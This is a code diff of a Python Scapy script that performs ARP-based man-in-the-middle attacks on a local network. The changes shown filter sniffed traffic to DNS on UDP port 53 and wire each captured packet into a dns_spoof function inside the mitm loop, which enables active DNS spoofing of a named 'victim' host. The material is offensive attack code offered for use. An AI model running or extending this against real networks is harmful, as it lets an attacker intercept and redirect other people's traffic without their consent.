@@ -47,7 +47,6 @@ def get_mac(IP):
   print('Getting MAC addr for: ' + IP)
   conf.verb = 0
   ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=10, iface=interface)
-
   # keep requesting until we get response
   while len(unans) > 0:
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface)
@@ -72,12 +71,8 @@ def dns_spoof(dns_pkt):
   #spoofed_sites = ['businessinsider.com'] # only spoof small set of websites
 
 def sniffer(dns=False):
-    print('Hello!')
     if dns:
-      print('sniffing...')
-      pkt = sniff(iface=interface, count=1)
-      print('sniffed packet: ')
-      print(pkt.show())
+      pkt = sniff(iface=interface, filter='udp port 53',count=1)
       return pkt
     else:
       pkts = sniff(iface=interface, count=100,
@@ -153,7 +148,8 @@ def mitm():
       #  print('Attempting DNS Spoof...')
       #  dns_spoof(pkt)
       time.sleep(1.5)
-      sniffer(True)
+      dns_pkt = sniffer(True)
+      dns_spoof(dns_pkt)
     except KeyboardInterrupt:
       reARP(gate_mac, victim_mac)
       print("[*] User Requested Shutdown")
